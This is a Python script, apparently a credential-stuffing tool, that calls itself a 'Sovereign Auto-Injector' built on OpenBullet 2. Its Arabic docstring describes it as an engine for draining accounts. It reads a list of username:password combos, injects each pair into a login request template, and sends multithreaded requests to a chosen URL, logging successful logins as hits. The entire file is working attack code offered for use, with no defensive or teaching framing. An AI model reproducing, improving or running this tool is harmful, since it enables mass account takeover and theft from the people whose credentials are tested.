#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Sovereign Auto-Injector v50.0 (OpenBullet 2 Sovereign Core)
المحرك الآلي لاستنزاف الحسابات وفحص الثغرات الجماعي بنمط السرب.
(c) 2026 Al-Mu'izz Sovereign Systems - Al-Ghazali Root
"""
import requests, threading, queue, json, time, sys, os
from datetime import datetime

class AutoInjector:
    def __init__(self, config_json):
        self.config = json.loads(config_json) if isinstance(config_json, str) else config_json
        self.target_url = self.config.get('url')
        self.method = self.config.get('method', 'POST')
        self.payload_template = self.config.get('payload', '')
        self.success_key = self.config.get('success_key', 'success')
        self.threads_count = self.config.get('threads', 10)
        self.work_queue = queue.Queue()
        self.results = []
        self.running = False
        self.stats = {"hits": 0, "checked": 0, "errors": 0}

    def load_wordlist(self, file_path):
        if os.path.exists(file_path):
            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                for line in f:
                    self.work_queue.put(line.strip())

    def worker(self):
        while not self.work_queue.empty() and self.running:
            combo = self.work_queue.get()
            try:
                if ':' in combo:
                    user, password = combo.split(':', 1)
                    payload = self.payload_template.replace('<USER>', user).replace('<PASS>', password)
                    start_time = time.time()
                    
                    if self.method == 'POST':
                        resp = requests.post(self.target_url, data=payload, timeout=10, headers={'User-Agent': 'Sovereign-Injector/50.0'})
                    else:
                        resp = requests.get(self.target_url, params=payload, timeout=10, headers={'User-Agent': 'Sovereign-Injector/50.0'})
                    
                    self.stats["checked"] += 1
                    if self.success_key in resp.text:
                        self.stats["hits"] += 1
                        result = {"combo": combo, "status": "HIT", "time": f"{time.time() - start_time:.2f}s", "timestamp": datetime.now().isoformat()}
                        self.results.append(result)
                
            except:
                self.stats["errors"] += 1
            finally:
                self.work_queue.task_done()

    def ignite(self):
        self.running = True
        threads = []
        for _ in range(self.threads_count):
            t = threading.Thread(target=self.worker)
            t.daemon = True
            t.start()
            threads.append(t)
        
        self.work_queue.join()
        self.running = False
        return {"results": self.results, "stats": self.stats}

if __name__ == "__main__":
    if len(sys.argv) > 2:
        conf = sys.argv[1]
        wlist = sys.argv[2]
        injector = AutoInjector(conf)
        injector.load_wordlist(wlist)
        final_data = injector.ignite()
        print(json.dumps(final_data, indent=2))
    else:
        print(json.dumps({"error": "Usage: auto_injector.py <config_json> <wordlist_path>"}))
